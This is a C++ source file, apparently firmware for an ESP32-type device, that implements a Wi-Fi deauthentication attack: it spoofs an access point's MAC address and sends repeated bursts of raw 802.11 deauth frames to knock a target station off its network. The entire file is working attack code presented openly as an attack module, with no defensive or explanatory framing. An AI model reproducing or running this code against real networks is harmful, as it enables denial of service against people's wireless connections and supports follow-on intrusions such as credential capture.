#include "Networks/Attacks/AttackDeauth.h"

#define SEND_PACKET_DELAY 1
#define SEND_BURST_DELAY 500
#define PACKETS_PER_BURST 100

const unsigned int ONE_CYCLE_BURST_SENDING =
    (SEND_PACKET_DELAY * PACKETS_PER_BURST + SEND_BURST_DELAY) + 1;

AttackDeauth::AttackDeauth(const MacAddress& sourceAP, const MacAddress& targetSTA){
    state.status = attack_status_t::Idle;
    state.sourceAP = sourceAP;
    state.targetSTA = targetSTA;

    memcpy(frame.access_point, sourceAP.bytes, 6);
    memcpy(frame.sender, sourceAP.bytes, 6);
    memcpy(frame.station, targetSTA.bytes, 6);
}

void AttackDeauth::start(unsigned int seconds){
    state.status = attack_status_t::Running;

    Serial.println("Sending");

    // one cycle = 100ms (burst) + 500ms (delay) = 600ms
    unsigned int times = seconds * 1000 / ONE_CYCLE_BURST_SENDING + 1; // 

    for(int i = 0; i < times; i++){
        for(int j = 0; j < PACKETS_PER_BURST; j++){
            sendDeauthFrame();
            delay(SEND_PACKET_DELAY);
        }
        Serial.print(".");
        delay(SEND_BURST_DELAY);
    }

    state.status = attack_status_t::Completed;
}

attack_status_t AttackDeauth::getStatus(){
    return state.status;
}

void AttackDeauth::sendDeauthFrame(){
    esp_wifi_80211_tx(WIFI_IF_AP, &frame, sizeof(frame), false);
}